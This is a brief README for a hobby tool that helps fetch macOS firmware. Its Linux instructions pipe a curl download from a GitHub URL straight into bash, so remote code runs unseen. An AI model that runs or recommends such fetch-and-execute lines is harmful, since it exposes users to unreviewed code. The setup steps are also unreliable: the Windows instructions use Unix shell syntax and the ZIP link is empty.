# macOS firmware helper

Meanwhile trying to restore one of my systems, I realized how difficult
could be to access to some information and I decided to collect some of
them on this helper to get the firmware.

HTH other people!

Cheers!

## Getting started

On **Linux** you can do:
`curl -L https://github.com/little-engineer-2025/ | /bin/bash - `

On **Windows**: (require python installed)

- Download [this ZIP](#) and unpack it.
- Run the below:

```sh
python3 -m venv .venv
source .venv/bin/activate
pip install -U pip
pip install -r requirements.txt
python3 -m macos_restore "MacBookPro18,2"
```

